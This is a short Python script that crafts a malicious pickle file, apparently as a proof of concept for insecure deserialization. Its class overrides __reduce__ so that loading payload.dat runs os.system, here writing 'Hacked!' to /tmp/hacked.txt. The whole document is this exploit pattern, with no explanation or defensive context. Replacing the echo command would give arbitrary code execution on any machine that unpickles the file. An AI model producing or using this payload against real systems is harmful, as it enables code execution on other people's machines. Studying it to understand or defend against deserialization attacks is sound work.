import pickle
import os

class EvilClass(object):
    def __reduce__(self):
        return (os.system, ('echo "Hacked!" > /tmp/hacked.txt',))

def serialize_exploit():
    with open('payload.dat', 'wb') as f:
        pickle.dump(EvilClass(), f)

serialize_exploit()
